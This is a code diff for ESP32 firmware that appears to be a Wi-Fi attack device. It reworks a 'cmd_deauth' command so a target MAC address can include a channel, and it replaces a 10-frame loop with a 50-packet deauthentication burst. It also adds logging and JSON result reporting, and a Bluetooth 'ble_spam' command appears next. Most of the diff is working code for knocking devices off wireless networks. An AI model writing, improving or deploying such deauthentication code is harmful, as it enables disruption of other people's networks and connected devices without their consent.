@@ -97,22 +97,38 @@ static void cmd_deauth(const char *mac_str) {
     return;
   }
 
+  // Parse MAC and optional channel (format: AA:BB:CC:DD:EE:FF or
+  // AA:BB:CC:DD:EE:FF:CH)
   uint8_t mac[6];
-  if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1],
-             &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
+  uint8_t channel = 0;
+
+  // Try to parse MAC:CH format first
+  if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx:%hhu", &mac[0], &mac[1],
+             &mac[2], &mac[3], &mac[4], &mac[5], &channel) < 6) {
     serial_send_json("error", "\"Invalid MAC format\"");
     return;
   }
 
-  gui_log_color("Deauth attack!", COLOR_RED);
+  char msg[64];
+  snprintf(msg, sizeof(msg), "DEAUTH %02X:..:%02X ch%d", mac[0], mac[5],
+           channel);
+  gui_log_color(msg, COLOR_RED);
 
-  // Send multiple deauth frames
-  for (int i = 0; i < 10; i++) {
-    wifi_send_deauth(NULL, mac, 0, 7);
-    vTaskDelay(pdMS_TO_TICKS(10));
-  }
+  ESP_LOGI(TAG, "Starting deauth burst: %02X:%02X:%02X:%02X:%02X:%02X ch=%d",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], channel);
 
-  serial_send_json("status", "\"Deauth sent\"");
+  // Use the optimized burst function - sends 50 packets in one WiFi session
+  esp_err_t ret = wifi_send_deauth_burst(NULL, mac, channel, 7, 50);
+
+  // Report results
+  char json[128];
+  snprintf(json, sizeof(json),
+           "{\"type\":\"deauth_result\",\"success\":%s,\"channel\":%d}",
+           (ret == ESP_OK) ? "true" : "false", channel);
+  serial_send_json_raw(json);
+
+  ESP_LOGI(TAG, "Deauth burst complete: %s",
+           (ret == ESP_OK) ? "SUCCESS" : "FAILED");
 }
 
 static void cmd_ble_spam(const char *type) {
